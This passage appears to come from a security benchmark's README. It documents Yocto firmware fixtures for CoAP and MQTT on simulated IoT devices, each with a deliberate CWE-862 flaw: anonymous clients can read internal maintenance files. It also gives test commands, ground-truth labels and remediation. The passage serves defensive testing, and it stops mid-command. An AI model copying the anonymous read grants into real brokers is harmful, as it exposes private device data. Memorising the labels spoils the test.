  --image /export/smartbulb-cwe862-coap-internal-files/qemuarm64/iotbench-smartbulb-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~


### CoAP Internal Files — smarthub

Simulated device: **controller/smart hub**, reusing
`meta-iotbench/recipes-devices/smarthub/`. Firmware directory:
`deploy-images/smarthub-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smarthub-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/smarthub-cwe862-coap-internal-files/qemuarm64/iotbench-smarthub-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=smarthub`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smarthub-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=smarthub-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=smarthub` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device smarthub`.
Alternatively, use `--boot smarthub` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
  --image /export/smarthub-cwe862-coap-internal-files/qemuarm64/iotbench-smarthub-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~


### CoAP Internal Files — smartplug

Simulated device: **energy-management smart plug**, reusing
`meta-iotbench/recipes-devices/smartplug/`. Firmware directory:
`deploy-images/smartplug-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartplug-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/smartplug-cwe862-coap-internal-files/qemuarm64/iotbench-smartplug-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=smartplug`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartplug-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=smartplug-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=smartplug` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device smartplug`.
Alternatively, use `--boot smartplug` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
  --image /export/smartplug-cwe862-coap-internal-files/qemuarm64/iotbench-smartplug-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~


### CoAP Internal Files — smartspeaker

Simulated device: **audio/voice-assistant smart speaker**, reusing
`meta-iotbench/recipes-devices/smartspeaker/`. Firmware directory:
`deploy-images/smartspeaker-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartspeaker-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/smartspeaker-cwe862-coap-internal-files/qemuarm64/iotbench-smartspeaker-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=smartspeaker`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartspeaker-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=smartspeaker-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=smartspeaker` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device smartspeaker`.
Alternatively, use `--boot smartspeaker` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
  --image /export/smartspeaker-cwe862-coap-internal-files/qemuarm64/iotbench-smartspeaker-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~


### CoAP Internal Files — thermostat

Simulated device: **climate-control thermostat**, reusing
`meta-iotbench/recipes-devices/thermostat/`. Firmware directory:
`deploy-images/thermostat-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-thermostat-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/thermostat-cwe862-coap-internal-files/qemuarm64/iotbench-thermostat-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=thermostat`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=thermostat-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=thermostat-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=thermostat` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device thermostat`.
Alternatively, use `--boot thermostat` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
  --image /export/thermostat-cwe862-coap-internal-files/qemuarm64/iotbench-thermostat-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~

## MQTT Server Communicating with Vulnerable Internal Files

### Build, boot and manual testing

**What this tests.** The broker lets an anonymous client read two retained
topics populated from the firmware's internal files.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe862-mqtt-internal-files docker compose run --rm yocto
QEMU_HTTP_PORT=18080 QEMU_MQTT_PORT=21883 \
  FIRMWARE=router-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
```

**Test — second host terminal**, after boot:

```bash
python3 scripts/test-mqtt-internal-files.py --port 21883 --get device/config
python3 scripts/test-mqtt-internal-files.py --port 21883 --get maintenance/info
```

Expected: the first payload contains `MQTT_INTERNAL_CONFIG_EXPOSED` and
`device_class=router`; the second contains `MQTT_INTERNAL_MAINTENANCE_EXPOSED`.
The client reads these messages without a username or password, confirming
anonymous access to internal data. Topic names have no leading `/`.

If Mosquitto clients are already installed on the host, the equivalent test is:

```bash
mosquitto_sub -h 127.0.0.1 -p 21883 -t device/config -C 1 -W 10
mosquitto_sub -h 127.0.0.1 -p 21883 -t maintenance/info -C 1 -W 10
```

**Comparison — guest:** payloads must match `device.conf` and `maintenance.dat`
under `/usr/share/iotbench/mqtt-internal-files/internal/`.
The client port must match `QEMU_MQTT_PORT`.

> INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT

### Scenario and authorization boundary

Every implemented device profile has a separate
`<device>-cwe862-mqtt-internal-files` image. These images reuse the existing
Yocto image/device includes, pinned Mosquitto recipe, systemd startup,
peripheral simulator, architecture selector and build/export scripts. Each
installs exactly one vulnerability package, `cwe862-mqtt-internal-files`.
The existing MQTT architecture remains a local Mosquitto broker with firmware
publishers; the router, camera and PLC receive that same broker as a fixture
component alongside their HTTP or Modbus service.

Expected ground-truth label: **MQTT Server Communicating with Vulnerable
Internal Files**. Expected weakness: **CWE-862 — Missing Authorization**.
The consequence is unsafe exposure of synthetic internal firmware information.
The finding requires all four elements: **internal firmware file + MQTT
publisher + MQTT-accessible topic + insufficient topic access restriction**.
An analyzer must establish their relationship; a broker, file, topic name or
exposure marker alone is insufficient.

A client reaching guest TCP `1883` connects anonymously and subscribes to
`device/config` or `maintenance/info`. The broker's public ACL explicitly
grants every anonymous subscriber read access to these internal-maintenance-only
topics. It never requires a maintenance identity or role. The defect is that
specific read grant, rather than a credential bypass or another vulnerability.
Ordinary public peripheral telemetry remains under `iotbench/<device>/#`.
Public MQTT writes, including writes to the internal topics, are denied.

### Fixed internal files, topics and data flow

| Vulnerable MQTT topic | Fixed firmware file | Synthetic contents |
| --- | --- | --- |
| `device/config` | `/usr/share/iotbench/mqtt-internal-files/internal/device.conf` | Device class, fake asset reference, synthetic calibration profile and diagnostic mode; `MQTT_INTERNAL_CONFIG_EXPOSED` |
| `maintenance/info` | `/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat` | Fake maintenance reference, fixture service window and synthetic self-test state; `MQTT_INTERNAL_MAINTENANCE_EXPOSED` |

Both files ship inside the firmware, contain the exact warning above, and are
marked `fixture_scope=internal-maintenance-only`. Their contents are authored
fixture data, with no host data, real credentials, API keys, tokens,
certificates, personal information or external-system data. The config's
`@DEVICE@` placeholder becomes the selected device class during the image's
rootfs postprocessing; the maintenance file is identical across devices.
These are private maintenance artifacts by fixture policy. Publishing them to
arbitrary subscribers crosses that intended boundary, even though all values
are synthetic. Unix permissions are root:mqttfixture `0640` inside a `0750`
directory, so they are not ordinary world-readable firmware files.

The concrete vulnerable flow is:

~~~text
fixed internal synthetic device.conf / maintenance.dat
  -> mappings[] supplies a constant filename and corresponding topic
  -> read_internal(): openat(fixed directory, constant filename), fstat, read
  -> publish_files(): mosquitto_publish(topic, exact file bytes, QoS 1, retained)
  -> local Mosquitto receives the publication on guest-loopback TCP 1884
  -> public listener TCP 1883 applies iotbench-public.acl
  -> anonymous topic read is granted without maintenance authorization
  -> MQTT subscriber receives the internal file contents
~~~

The C source `files/iotbench-mqtt-internal-files.c` in
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/` contains the static
`mappings[]` table. `main()` opens only the fixed internal directory and connects
only to `127.0.0.1:1884` in the guest. `read_internal()` reads one of the two
constant filenames; `publish_files()` passes those bytes directly to
`mosquitto_publish()`. The publisher has no subscriptions or message callback,
so MQTT messages cannot select filenames, paths, commands or operations.
It publishes both files every five seconds, with retained QoS 1 messages for
new subscribers. Retention is in broker memory, with disk persistence disabled.

Expected static-analysis finding: join the image-installed private files,
constant mappings, `openat`/`read` to `mosquitto_publish` data flow, active broker
configuration and anonymous `topic read` grants. Identify the absent
maintenance-role authorization before disclosure. Source annotation
`publisher.c` and `ground-truth.json` are installed alongside the real ELF,
configuration, ACLs and synthetic files to support firmware analysis.
No external analysis engine is required to inspect this short chain.

### Broker, startup and ACL configuration

| Component | Firmware path / behavior |
| --- | --- |
| Local broker | `/usr/sbin/mosquitto`, from the existing pinned `mosquitto_2.1.2.bb` recipe |
| Active broker config | `/etc/mosquitto/iotbench.conf`; public listener `0.0.0.0:1883`, private publishing listener `127.0.0.1:1884`, `per_listener_settings true`, `allow_anonymous true`, `persistence false` |
| Public ACL | `/etc/mosquitto/iotbench-public.acl`; ordinary `topic read iotbench/#` plus **intentionally unsafe** `topic read device/config` and `topic read maintenance/info`; all writes/other reads denied by default |
| Publishing ACL | `/etc/mosquitto/iotbench-publish.acl`; write-only access to `iotbench/#`, `device/config`, `maintenance/info`; no reads or other writes |
| Broker startup | `/usr/lib/systemd/system/mosquitto.service.d/10-iotbench-listener.conf`; replaces `ExecStart` with `/usr/sbin/mosquitto -c /etc/mosquitto/iotbench.conf` and uses the existing `Type=simple` convention |
| Fixture publisher | `/usr/bin/iotbench-mqtt-internal-files`; ordinary root-owned `0755`, no SUID/SGID |
| Publisher startup | `/usr/lib/systemd/system/iotbench-mqtt-internal-files.service`; enabled at `multi-user.target`, `After`/`Requires`/`PartOf=mosquitto.service`, restart on failure |
| Publisher identity | `mqttfixture`, locked UID/GID `991:991`, `/bin/false`, no OS login credential |
| Native telemetry integration | `/usr/lib/systemd/system/iotbench-mqtt.service.d/10-fixture-publisher.conf`; sets `MQTT_BROKER=127.0.0.1 MQTT_PORT=1884` for existing MQTT profiles |
| Private files | `/usr/share/iotbench/mqtt-internal-files/internal/{device.conf,maintenance.dat}`, root:991 `0640`, parent `0750` |
| Analysis annotations | `/usr/share/iotbench/mqtt-internal-files/{publisher.c,ground-truth.json,NOTICE}`, `0644` |
| Firmware warning | `NOTICE`, each internal file, `/etc/motd`, publisher startup log and image recipe description |

Mosquitto's [ACL documentation](https://mosquitto.org/man/mosquitto-conf-5.html)
defines the initial `topic` rules as applying to anonymous clients. Its
[client API](https://mosquitto.org/api/files/mosquitto-h.html) supplies the
publisher's connect/loop/publish operations. No different broker, framework or
custom MQTT protocol implementation replaces the repository architecture.
The recipe compiles local C sources with `${CC}`, `${CFLAGS}`, `${LDFLAGS}`
and `-lmosquitto`, using the existing recipe dependency. No publisher or broker
invokes a shell or package manager.

The public listener is reachable only through host-loopback forwarding in
`scripts/run-qemu.sh`. Port `1884` is bound to **guest loopback**, never forwarded,
and has no external broker bridge. The fixed publisher client ID is only a
protocol correlation label; ACLs do not trust it as an authentication identity.
No MQTT username, password or shared authorization secret is introduced.
The existing serial-console lab login belongs to the common harness and is
unnecessary for anonymous MQTT exposure.

The native telemetry script accepts `MQTT_PORT` with its existing `1883`
default. Only these fixtures set it to `1884`, allowing the shared publisher to
continue serving normal peripheral telemetry through the same broker while the
public listener remains read-only. Non-MQTT profiles retain their camera/HTTP
or Modbus services; the telemetry drop-in is inert when that unit is absent.

The fixture publisher runs unprivileged, with strict filesystem protection,
no new privileges, an empty capability set, private temporary/device namespaces,
and loopback-only network policy. It opens the fixed directory and filenames
with `O_NOFOLLOW`; regular-file checks and bounded reads limit each payload to
1024 bytes. Missing, empty, symlink, non-regular or oversized files clear the
corresponding retained message rather than expose stale data. Invalid files
cannot redirect the read or block on a FIFO. Valid contents are read again on
the next publishing cycle. A broker restart restarts the fixture publisher and
repopulates both retained topics. There is no application filesystem write.

### Scope and distinctions

These are firmware-integrated MQTT fixtures, rather than generic Java/JAR apps
or unrelated vulnerable C executables: Yocto installs the files, ELF, broker,
ACLs and enabled services together in each device image. They differ from an
ordinary MQTT broker because an actual publisher reads private firmware files
and sends their contents to incorrectly authorized topics. They differ from
public telemetry because both files are explicitly internal-maintenance-only.
They differ from ordinary private files never exposed through MQTT because the
file bytes are observable over a real MQTT subscription.

They differ from Path Traversal and arbitrary file-read examples: all paths are
implementation constants and the publisher accepts no client input. Unknown or
path-like topics do not cause file access. They differ from command-execution
vulnerabilities: no received command is interpreted, no shell is launched and
no arbitrary program runs. They differ from hardcoded-credential fixtures:
there is no MQTT credential. They differ from correctly protected MQTT topics:
the public ACL explicitly lets anonymous clients read the internal-data topics
without a maintenance access decision. None of the existing command-injection,
overflow, replay, sudo or other vulnerability packages is installed.

### Shared local build and testing

Run from the host repository root. Default machine is `qemuarm64`; use
`YOCTO_MACHINE` for the existing supported architecture selector.

~~~bash
# Parse the layer and resolve dependencies without compiling.
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe862-mqtt-internal-files'
# Build and boot a fixture.
FIRMWARE=router-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=router-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

From a second host terminal, fetch the exact internal-file content anonymously:

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
# Equivalent with locally installed Mosquitto clients; no username/password:
mosquitto_sub -h 127.0.0.1 -p 1883 -t device/config -C 1 -W 10
mosquitto_sub -h 127.0.0.1 -p 1883 -t maintenance/info -C 1 -W 10
# Protocol regression against the running fixture:
python3 scripts/test-mqtt-internal-files.py --device router
~~~

Expect the exact warning, fixture scope and exposure markers, with
`device_class=router` on `device/config`. The Python client uses MQTT 5 without
credentials. Regression verifies both exact payloads, wildcard access, public
write denial with MQTT 5 `Not authorized` PUBACK (`0x87`), denial even with
spoofed usernames, and no payloads for unknown/path-like topics. On the eight
MQTT-native profiles it also verifies normal peripheral telemetry.
`QEMU_MQTT_PORT` changes the loopback host TCP port; use the matching `--port`
in the test client. Existing HTTP and PLC Modbus forwards remain available.

Automatic disposable QEMU testing must run separately from manually booted QEMU:

~~~bash
python3 scripts/test-mqtt-internal-files.py --boot router
python3 scripts/test-mqtt-internal-files.py --all
# Example on Apple Silicon, with unused host ports:
QEMU_ACCEL=hvf QEMU_CPU=host QEMU_HTTP_PORT=18080 \
  QEMU_MQTT_PORT=21883 QEMU_MODBUS_PORT=11502 \
  python3 scripts/test-mqtt-internal-files.py --all
~~~

The automatic test uses the existing serial-console harness to change only the
synthetic internal config inside a throwaway guest snapshot. Its new probe
bytes must appear on `device/config`, proving real file origin. It then checks
missing/symlink/oversized/FIFO rejection and retained-data removal, restores the
original bytes, restarts the broker, and verifies topic recovery and a
loopback-bound publishing listener. None of these console probes is available
through MQTT. `validation-console.log` is stored beside each export.
The host client never scans or contacts non-loopback systems.

Offline inspection, with the builder's existing `debugfs` and `zstd` tools:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/router-cwe862-mqtt-internal-files/qemuarm64/iotbench-router-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

This verifies exact device/file contents and ownership, ELF topic mappings and
publish sink, installed analysis source/ground truth/warnings, locked service
account, enabled startup, broker configuration, ACLs and telemetry integration.
No host rootfs mount is needed. Build all eleven fixtures using:

~~~bash
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe862-mqtt-internal-files.bb; do
    firmware=$(basename "$recipe" .bb)
    FIRMWARE="${firmware#iotbench-}" docker compose run --rm yocto || exit 1
done
~~~

The existing `scripts/build-all.sh` discovers these images automatically.
Artifacts land in `deploy-images/<device>-cwe862-mqtt-internal-files/<machine>/`.

### Safe remediation

Remove the public `topic read device/config` and `topic read maintenance/info`
grants, or remove these private publications from the public broker. If
maintenance clients need them, authenticate those clients and authorize each
sensitive topic for a narrowly defined maintenance role. Encryption alone does
not enforce that topic-level decision. Preserve constant filenames, bounded
read-only behavior, unprivileged services and normal Unix file permissions.

A corrected variant must deny anonymous read access to both private topics,
continue denying public writes and unrelated reads, preserve public telemetry,
and allow only authorized maintenance subscribers. Rebuild the image after the
ACL/source change; disposable snapshots discard guest edits. The known-positive
anonymous exposure assertion must fail against the corrected image.

### Completed validation

On 2026-10-07, all eleven `qemuarm64` fixtures built and exported successfully
following BitBake layer parsing and a router dependency dry run. Offline
`debugfs` inspection of every compressed ext4 image verified exact synthetic
file contents/device identity, fixed topic/file mappings and publish sink in
the ELF, matching installed source/ground truth, locked UID/GID 991 account,
private `0640` files inside `0750`, enabled publisher/broker, active broker
configuration, ACLs, telemetry drop-in and required warning. Each manifest
contained exactly one vulnerability package, `cwe862-mqtt-internal-files`.
The publisher ELF was identical across all eleven images.

All eleven images passed in disposable QEMU snapshots with HVF/host CPU:
anonymous exact-file reads, wildcard disclosure, public write denial with
MQTT 5 `0x87` (also with spoofed usernames), no payloads from unknown/path-like
topics, actual file-origin probe, missing/symlink/oversized/FIFO rejection,
retained-content removal, original-byte restoration, broker restart and
private listener binding. All eight MQTT-native profiles also passed peripheral
telemetry checks. Tests used host-loopback MQTT 21883, HTTP 18080 and PLC
Modbus 11502; no external broker or infrastructure was contacted.

A separate disposable router control on host-loopback MQTT 22883 removed only
the two anonymous internal-topic read grants. Both disclosures stopped without
changing files or the publisher. Restoring those grants restored both exact
payloads, corroborating the topic authorization cause and remediation.

The [local validation report](../deploy-images/mqtt-internal-files-qemuarm64-validation.txt)
records results, rootfs/kernel/manifest checksums and source/ELF SHA-256 hashes.
Each export contains `rootfs.manifest`, `validation-console.log` and
`validation-protocol.log`. Build, offline, runtime and remediation logs are
under `deploy-images/mqtt-internal-files-*`. Other supported architectures were
not built or boot-tested. No external firmware-analysis engine was run; the
static finding remains expected ground truth supported by installed firmware
artifacts and real MQTT behavior.

### MQTT Internal Files — doorlock

Simulated device: **access-control door lock**, retaining existing MQTT peripheral telemetry.
Device profile: `meta-iotbench/recipes-devices/doorlock/`.
Firmware directory: `deploy-images/doorlock-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-doorlock-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/doorlock-cwe862-mqtt-internal-files/qemuarm64/iotbench-doorlock-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=doorlock`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=doorlock-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=doorlock-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device doorlock
~~~

Expected: exact internal bytes, `device_class=doorlock` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot doorlock` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
